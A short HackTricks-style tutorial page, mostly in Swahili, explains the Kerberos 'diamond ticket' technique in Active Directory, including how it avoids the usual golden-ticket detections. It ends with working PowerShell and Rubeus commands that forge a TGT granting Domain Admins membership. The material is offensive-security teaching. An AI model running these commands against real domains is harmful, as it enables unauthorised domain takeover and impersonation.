# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Kama tiketi ya dhahabu**, tiketi ya almasi ni TGT ambayo inaweza kutumika **kufikia huduma yoyote kama mtumiaji yeyote**. Tiketi ya dhahabu inaundwa kabisa mtandaoni, imefungwa kwa hash ya krbtgt ya eneo hilo, na kisha kuhamishwa kwenye kikao cha kuingia kwa matumizi. Kwa sababu waendesha eneo hawafuatilii TGTs ambazo zimepewa kihalali, watakubali kwa furaha TGTs ambazo zimefungwa kwa hash yao ya krbtgt.

Kuna mbinu mbili za kawaida za kugundua matumizi ya tiketi za dhahabu:

- Angalia TGS-REQs ambazo hazina AS-REQ inayolingana.
- Angalia TGTs ambazo zina thamani za kipumbavu, kama vile muda wa miaka 10 wa Mimikatz.

**Tiketi ya almasi** inatengenezwa kwa **kubadilisha maeneo ya TGT halali ambayo ilitolewa na DC**. Hii inafikiwa kwa **kuomba** **TGT**, **kuifungua** kwa hash ya krbtgt ya eneo, **kubadilisha** maeneo yanayohitajika ya tiketi, kisha **kuifunga tena**. Hii **inasuluhisha mapungufu mawili yaliyotajwa hapo juu** ya tiketi ya dhahabu kwa sababu:

- TGS-REQs zitakuwa na AS-REQ inayotangulia.
- TGT ilitolewa na DC ambayo inamaanisha itakuwa na maelezo yote sahihi kutoka kwenye sera ya Kerberos ya eneo. Ingawa haya yanaweza kuundwa kwa usahihi katika tiketi ya dhahabu, ni ngumu zaidi na yanaweza kuwa na makosa.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
